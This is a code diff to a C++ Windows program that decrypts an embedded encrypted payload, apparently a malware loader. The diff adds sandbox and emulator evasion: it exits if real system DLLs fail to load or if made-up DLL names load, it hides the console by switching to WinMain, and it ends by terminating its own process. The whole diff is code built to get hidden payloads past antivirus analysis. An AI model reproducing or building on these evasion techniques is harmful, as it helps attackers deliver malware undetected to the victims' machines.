@@ -8,6 +8,7 @@
 
 #define sizeOfArray(arr) (sizeof(arr)/sizeof(arr[0]))
 #define ENC_DATA_SIZE (sizeOfArray(encData))
+#define MEMRESERVED 100000000
 
 
 #pragma comment(lib, "Crypt32.lib")
@@ -32,10 +33,40 @@ std::pair<char*, DWORD> decryptData(unsigned char encBufferInput[], const char* 
 
 }
 
+BOOL checkLoadDLL() {
+   
+    char const* realDLL[] = { "Kernel32.DLL", "networkexplorer.DLL", "NlsData0000.DLL" };
+    char const* falseDLL[] = { "NetProjW.DLL", "Ghofr.DLL", "fg122.DLL" };
+    HMODULE hInstLib;
+    for (int i = 0; i < 3; i++) {
+        hInstLib = LoadLibraryA(realDLL[i]);
+        if (hInstLib == nullptr) {
+           
+            return TRUE;
+        }
+        FreeLibrary(hInstLib);
+    }
 
-int main(int argc, char* argv[]) {
+    for (int i = 0; i < 3; i++) {
+        hInstLib = LoadLibraryA(falseDLL[i]);
+        if (hInstLib != nullptr) {
+
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hpInstance, LPSTR nCmdLine, int iCmdShow){
 
 	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	if (checkLoadDLL()) {
+		return 0;
+	}
 	
 	std::pair <char*, DWORD> decOut;
 	decOut = decryptData(encData, key);
@@ -47,6 +78,6 @@ int main(int argc, char* argv[]) {
 	}
 
 	*/
-
+	TerminateProcess(GetCurrentProcess(), 0);
 	return 0;
 }
